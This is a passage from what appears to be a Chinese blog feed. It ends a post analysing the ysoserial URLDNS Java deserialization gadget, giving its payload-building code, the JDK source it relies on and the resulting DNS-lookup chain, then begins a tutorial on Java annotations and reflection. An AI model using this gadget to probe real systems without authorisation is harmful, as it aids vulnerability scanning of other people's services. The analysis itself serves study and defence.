&lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>    <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>    ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>    Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>    <span class="hljs-keyword">return</span> ht;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们前⾯说了，触发反序列化的⽅法是 readObject ，因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链。</p><p>那么，我们可以直奔 HashMap 类的 readObject ⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-type">int</span>)fc));<br>        <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//在这里用HashMap的键名计算了Hash</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只是简简单单的调用了Key的hashCode(),我们EXP传入的Key是一个URL对象，所以来看<code>java.net.URL#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> hashCode;<br><br>    hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>开头会判断hashCode是否为-1，假如不是，则直接返回，这里就是我们之前Exp提到过的。<br>此处的handler是URLStreamHandler对象，然后跟进hashCode()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>     <span class="hljs-comment">// Generate the protocol part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>     <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>         h += protocol.hashCode();<br><br>     <span class="hljs-comment">// Generate the host part.</span><br>     <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>     <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>         h += addr.hashCode();<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>         <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>             h += host.toLowerCase().hashCode();<br>     &#125;<br><br>     <span class="hljs-comment">// Generate the file part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>     <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>         h += file.hashCode();<br><br>     <span class="hljs-comment">// Generate the port part.</span><br>     <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>         h += getDefaultPort();<br>     <span class="hljs-keyword">else</span><br>         h += u.getPort();<br><br>     <span class="hljs-comment">// Generate the ref part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>     <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>         h += ref.hashCode();<br><br>     <span class="hljs-keyword">return</span> h;<br> &#125;<br></code></pre></td></tr></table></figure><p>这里是对传入的URL进行解析，将每部分的Hash值叠加最后返回。这里调用了一个<code>getHostAddress()</code>，跟进</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">InetAddress addr <span class="hljs-operator">=</span> getHostAddress(u)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            u.hostAddress = InetAddress.getByName(host);<br>        &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> u.hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键的地方<code>InetAddress.getByName(host);</code>，查看文档</p><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>确定主机名称的IP地址。<br>主机名称可以是机器名称，例如“ java.sun.com ”或其IP地址的文本表示。 如果提供了文字IP地址，则只会检查地址格式的有效性。</p></blockquote><p>也就是进行DNS解析,来看最后的利用链，比较简单：</p><blockquote><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p></blockquote><p>我们可以通过这条链很容易判断是否存在反序列化漏洞</p><p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。</p><p>另外，ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀个 SilentURLStreamHandler 类，这不是必须的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java之反射与注解</title>
    <link href="/Decemberus.github-io/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/"/>
    <url>/Decemberus.github-io/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Java之反射与注解"><a href="#Java之反射与注解" class="headerlink" title="Java之反射与注解"></a>Java之反射与注解</h1><h1 id="注解Annotation"><a href="#注解Annotation" class="headerlink" title="注解Annotation"></a>注解Annotation</h1><h2 id="1、什么是注解"><a href="#1、什么是注解" class="headerlink" title="1、什么是注解"></a>1、什么是注解</h2><p>Annotation 是从JDK5.0开始引入的新技术 .</p><h3 id="Annotation的作用"><a href="#Annotation的作用" class="headerlink" title="Annotation的作用"></a>Annotation的作用</h3><p>不是程序本身 , 可以对程序作出解释.(这一点和注释(comment)没什么区别)</p><p>可以被其他程序(比如:编译器等)读取.</p><h3 id="Annotation的格式"><a href="#Annotation的格式" class="headerlink" title="Annotation的格式"></a>Annotation的格式</h3><p>注解是以”@注释名”在代码中存在的</p><p>还可以添加一些参数值 , 例如:@SuppressWarnings(value&#x3D;”unchecked”)</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300638.png" alt="image-20220929195515728"> </p><h3 id="Annotation在哪里使用"><a href="#Annotation在哪里使用" class="headerlink" title="Annotation在哪里使用?"></a>Annotation在哪里使用?</h3><p>可以附加在package , class , method , fifield 等上面 , 相当于给他们添加了额外的辅助信息</p><p>我们可以通过反射机制实现对这些元数据的访问</p><h2 id="2、内置注解"><a href="#2、内置注解" class="headerlink" title="2、内置注解"></a>2、内置注解</h2><p>下面提供一些常用的内置注解</p><h3 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h3><p>定义在 java.lang.Override 中 , 此注释只适用于修辞方法 , 表示一个方法声明打算重写超类中的另一个方法声明.</p><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h3><p>定义在java.lang.Deprecated中 , 此注释可以用于修辞方法 , 属性 , 类 ,</p><p>表示不鼓励程序员使用这样的元素 , 通常是因为它很危险或者存在更好的选择 .</p><h3 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h3><p>定义在java.lang.SuppressWarnings中,用来抑制编译时的警告信息.</p><p>与前两个注释有所不同,你需要添加一个参数才能正确使用,这些参数都是已经定义好了的,我们</p><p>选择性的使用就好了 .</p><p>@SuppressWarnings(“all”)</p><p>@SuppressWarnings(“unchecked”)</p><p>@SuppressWarnings(value&#x3D;{“unchecked”,”deprecation”})</p><p>等等 </p><h2 id="3、元注解"><a href="#3、元注解" class="headerlink" title="3、元注解"></a>3、元注解</h2><p>元注解的作用就是负责注解其他注解 , Java定义了4个标准的meta-annotation类型,他们被用来提供对其他annotation类型作说明 .</p><p>这些类型和它们所支持的类在java.lang.annotation包中可以找到 .( @Target , @Retention ,@Documented , @Inherited )</p><p>@Target : 用于描述注解的使用范围(即:被描述的注解可以用在什么地方)</p><p>@Retention : 表示需要在什么级别保存该注释信息 , 用于描述注解的生命周期</p><p>(SOURCE &lt; CLASS &lt; RUNTIME)</p><p>@Document：说明该注解将被包含在javadoc中</p><p>@Inherited：说明子类可以继承父类中的该注解</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300481.png" alt="image-20220929205025676"> </p><h2 id="4、自定义注解"><a href="#4、自定义注解" class="headerlink" title="4、自定义注解"></a>4、自定义注解</h2><p>使用 @interface自定义注解时 , 自动继承了java.lang.annotation.Annotation接口</p><p><strong>分析 :</strong></p><p>1、@ interface用来声明一个注解 , 格式 : public @ interface 注解名 { 定义内容 }</p><p>2、其中的每一个方法实际上是声明了一个配置参数.</p><p>3、方法的名称就是参数的名称.</p><p>4、返回值类型就是参数的类型 ( 返回值只能是基本类型,Class , String , enum ).</p><p>5、可以通过default来声明参数的默认值</p><p>6、如果只有一个参数成员 , 一般参数名为value</p><p>7、注解元素必须要有值 , 我们定义注解元素时 , 经常使用空字符串,0作为默认值 </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300905.png" alt="image-20220929212624141"> 可以看到上述示例代码</p><h1 id="反射机制Reflection"><a href="#反射机制Reflection" class="headerlink" title="反射机制Reflection"></a>反射机制Reflection</h1><h2 id="1、静态与动态语言"><a href="#1、静态与动态语言" class="headerlink" title="1、静态与动态语言"></a>1、静态与动态语言</h2><ul><li><p>动态语言</p><ul><li>是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</li><li>主要动态语言：Object-C、C#、JavaScript、PHP、Python等。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//体现动态语言的代码 </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;var a=3;var b=5;alert(a+b)&quot;</span>;<br>    <span class="hljs-built_in">eval</span>(x); &#125;<br></code></pre></td></tr></table></figure></li><li><p>静态语言</p><ul><li>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</li><li>Java不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性，我们可以利用反射机制获得类似动态语言的特性。Java的动态性让编程的时候更加灵活！</li></ul></li></ul><h2 id="2、Java-Reflection"><a href="#2、Java-Reflection" class="headerlink" title="2、Java Reflection"></a>2、Java Reflection</h2><p>Reflection（反射）是Java被视为动态语言的关键，反射机制允许程序在执行期借助于Reflflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)<br></code></pre></td></tr></table></figure><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：<strong>反射</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300729.png" alt="image-20220929220025130"> </p><h3 id="Java反射提供的功能"><a href="#Java反射提供的功能" class="headerlink" title="Java反射提供的功能"></a>Java反射提供的功能</h3><ul><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li>生成动态代理</li></ul><h3 id="Java反射优点和缺点"><a href="#Java反射优点和缺点" class="headerlink" title="Java反射优点和缺点"></a>Java反射优点和缺点</h3><p>优点：可以实现动态创建对象和编译，体现出很大的灵活性 !</p><p>缺点：对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于 直接执行相同的操作</p><h2 id="3、反射主要的api"><a href="#3、反射主要的api" class="headerlink" title="3、反射主要的api"></a>3、反射主要的api</h2><p>java.lang.Class : 代表一个类</p><p>java.lang.reflflect.Method : 代表类的方法</p><p>java.lang.reflflect.Field : 代表类的成员变量</p><p>java.lang.reflflect.Constructor : 代表类的构造器</p><h2 id="4、Class类"><a href="#4、Class类" class="headerlink" title="4、Class类"></a>4、Class类</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300460.png" alt="image-20220930190137096"> </p><p>这是一些基本方法，创建一个构造器，一个有参构造器，一个重写str方法</p><p>在Object类中定义了以下的方法，此方法将被所有子类继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Class <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>以上的方法返回值的类型是一个Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即：可以通过对象反射求出类的名称</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300243.png" alt="image-20220930193349643"> </p><p>对象照镜子后可以得到的信息：某个类的属性、方法和构造器、某个类到底实现了哪些接口。对于每个类而言，JRE 都为其保留一个不变的 Class 类型的对象。一个 Class 对象包含了特定某个结构(class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F;primitive type&#x2F;void&#x2F;[])的有关信息</p><ul><li>Class 本身也是一个类</li><li>Class 对象只能由系统建立对象</li><li>一个加载的类在 JVM 中只会有一个Class实例</li><li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li><li>每个类的实例都会记得自己是由哪个 Class 实例所生成</li><li>通过Class可以完整地得到一个类中的所有被加载的结构</li><li>Class类是Reflflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象</li></ul><p>下面代码介绍了获取class的多种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        person  person1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">student</span>();<br>        System.out.println(<span class="hljs-string">&quot;this is &quot;</span>+person1.name);<br>        <span class="hljs-comment">//通过对象获得</span><br>        Class c1=person1.getClass();<br>        <span class="hljs-comment">//通过forname获得</span><br>        Class c2=Class.forName(<span class="hljs-string">&quot;student&quot;</span>);<br>        <span class="hljs-comment">//通过类名.class获得</span><br>        Class c3=student.class;<br>        <span class="hljs-comment">//通过type获得</span><br>        Class c4=Integer.TYPE;<br>        <span class="hljs-comment">//获取父类类型</span><br>        Class c5=c2.getClass();<br>        System.out.println(c3.hashCode());<br>        System.out.println(c2.hashCode());<br>        System.out.println(c1.hashCode());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">student</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;学生&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">teacher</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;老师&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300323.png" alt="image-20220930193902067"> </p><h3 id="获取class的实例"><a href="#获取class的实例" class="headerlink" title="获取class的实例"></a>获取class的实例</h3><p>a）若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class c1=Person.class<br></code></pre></td></tr></table></figure><p>b）已知某个类的实例，调用该实例的getClass()方法获取Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><p>c）已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能抛出ClassNotFoundException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><p>d）内置基本数据类型可以直接用类名.Type</p><p>e）还可以利用ClassLoader我们之后讲解</p><h3 id="那一些类型可以有Class对象"><a href="#那一些类型可以有Class对象" class="headerlink" title="那一些类型可以有Class对象"></a>那一些类型可以有Class对象</h3><ul><li>class：外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类</li><li>interface：接口</li><li>[]：数组</li><li>enum：枚举</li><li>annotation：注解@interface</li><li>primitive type：基本数据类型</li><li>void</li></ul><p>有一个有趣的小实验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">100</span>];<br>        <span class="hljs-type">int</span>[] b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];<br>        System.out.println(a.getClass().hashCode());<br>        System.out.println(b.getClass().hashCode());<br><br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出结果为</span><br><span class="hljs-number">41903949</span><br><span 